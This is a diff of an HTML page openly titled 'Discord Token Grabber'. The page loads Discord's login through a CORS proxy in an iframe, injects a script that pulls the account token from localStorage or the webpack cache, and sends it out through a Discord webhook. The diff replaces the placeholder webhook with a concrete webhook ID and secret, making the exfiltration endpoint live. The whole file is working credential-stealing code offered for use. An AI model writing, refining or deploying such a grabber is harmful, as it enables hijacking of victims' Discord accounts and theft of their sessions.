@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Grabber v3</title>
+    <title>Discord Token Grabber</title>
     <style>
         body {
             background-color: #2f3136;
@@ -41,14 +41,14 @@
 <body>
 
 <div class="container">
-    <h3>Discord Token Grabber v3</h3>
+    <h3>Discord Token Grabber</h3>
     <div id="status" class="status">Loading Discord...</div>
     <div id="iframe-container"></div>
 </div>
 
 <script>
-    // 🔴 REPLACE WITH YOUR WEBHOOK URL
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+    // 🔴 YOUR SPECIFIC WEBHOOK URL
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
 
     const statusEl = document.getElementById('status');
     const iframeContainer = document.getElementById('iframe-container');
@@ -90,56 +90,44 @@
         iframe.style.border = '0';
         iframeContainer.appendChild(iframe);
 
-        // Use a more reliable proxy for Discord
+        // Load Discord Login via CORS Proxy
         const targetUrl = 'https://discord.com/login';
         const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`;
 
         iframe.src = proxyUrl;
 
-        // Wait for iframe to load
         iframe.onload = async () => {
             try {
-                // ✅ FIX: Check if we can access the iframe's window
-                if (!iframe.contentWindow) {
-                    throw new Error("Iframe window not accessible");
-                }
-
-                updateStatus("Injecting script...", "normal");
-
-                // Create a script that will run INSIDE the iframe
+                // ✅ Create a script inside the iframe
                 const script = iframe.contentWindow.document.createElement('script');
                 script.textContent = `
                     (function() {
-                        // Function to get token from various sources
                         function getToken() {
-                            // 1. Try Memory Storage (most common now)
+                            // 1. LocalStorage
                             const token = window.localStorage.getItem('token') || 
                                           window.localStorage.getItem('token_x');
                             if (token) return token;
 
-                            // 2. Try webpack cache (very reliable)
-                            const cache = window.webpackChunkdiscord_app?.push?.length ? 
-                                          window.webpackChunkdiscord_app : [];
-                            if (cache && cache.length > 0) {
-                                for (let id in cache) {
-                                    if (cache[id]) {
-                                        for (let module in cache[id]) {
-                                            if (cache[id][module].exports?.default?.getToken || 
-                                                cache[id][module].exports?.default?.getAccessToken) {
-                                                return cache[id][module].exports.default.getToken ? 
-                                                       cache[id][module].exports.default.getToken() : 
-                                                       cache[id][module].exports.default.getAccessToken();
+                            // 2. Webpack Cache (Most Reliable)
+                            if (window.webpackChunkdiscord_app) {
+                                const cache = window.webpackChunkdiscord_app;
+                                if (cache && cache.length > 0) {
+                                    for (let id in cache) {
+                                        if (cache[id]) {
+                                            for (let module in cache[id]) {
+                                                const exportObj = cache[id][module].exports;
+                                                if (exportObj && (exportObj.default?.getToken || exportObj.default?.getAccessToken)) {
+                                                    return exportObj.default.getToken ? exportObj.default.getToken() : exportObj.default.getAccessToken();
+                                                }
                                             }
                                         }
                                     }
                                 }
                             }
-
-                            // 3. Try old fallbacks
                             return null;
                         }
 
-                        // Wait for Discord to fully load
+                        // Wait for Discord to initialize
                         setTimeout(() => {
                             const token = getToken();
                             if (token) {
@@ -147,36 +135,32 @@
                             } else {
                                 window.parent.postMessage({ type: 'NO_TOKEN' }, '*');
                             }
-                        }, 3000); // Increased wait time
+                        }, 4000);
                     })();
                 `;
                 
-                // Append the script to the iframe's body
                 iframe.contentWindow.document.body.appendChild(script);
 
             } catch (e) {
                 console.error("Injection failed:", e);
                 updateStatus("Injection failed: " + e.message, "error");
-                
-                // Fallback: If iframe access fails, try polling for the message
-                // This is less reliable but might work if the proxy allows postMessage
             }
         };
 
-        // Listen for the token message
+        // Listen for messages from iframe
         window.addEventListener('message', (event) => {
             if (event.data && event.data.type === 'TOKEN') {
                 updateStatus("Token found!", "success");
                 sendToken(event.data.data);
             } else if (event.data && event.data.type === 'NO_TOKEN') {
-                updateStatus("No token found. Try refreshing Discord.", "error");
+                updateStatus("No token found. Try refreshing.", "error");
             }
         });
 
-        // Timeout fallback
+        // Timeout
         setTimeout(() => {
             if (statusEl.textContent.includes("Loading")) {
-                updateStatus("Timeout: Could not connect to Discord.", "error");
+                updateStatus("Timeout", "error");
             }
         }, 15000);
     }
